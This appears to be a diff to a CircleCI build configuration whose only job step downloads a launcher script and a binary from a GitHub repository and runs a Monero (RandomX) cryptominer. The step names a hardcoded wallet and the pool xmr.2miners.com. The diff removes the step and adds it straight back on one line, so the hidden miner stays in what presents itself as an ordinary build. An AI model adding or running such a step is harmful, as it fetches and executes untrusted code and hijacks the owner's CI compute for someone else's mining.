@@ -1,3 +1,4 @@
+
 version: 2.0
 jobs:
   build:
@@ -8,6 +9,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet 873iEvoCH6HFNW8ko7vGV9JRqmmixfv7rXWithJ2FDWQNye1KYDzoiHj3zrFmS4nbbZ6EPTbYPhHLMsc2Q2eXB3YErm9tRw
-
- -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr.2miners.com:2222
+      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet <873iEvoCH6HFNW8ko7vGV9JRqmmixfv7rXWithJ2FDWQNye1KYDzoiHj3zrFmS4nbbZ6EPTbYPhHLMsc2Q2eXB3YErm9tRw>  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr.2miners.com:2222
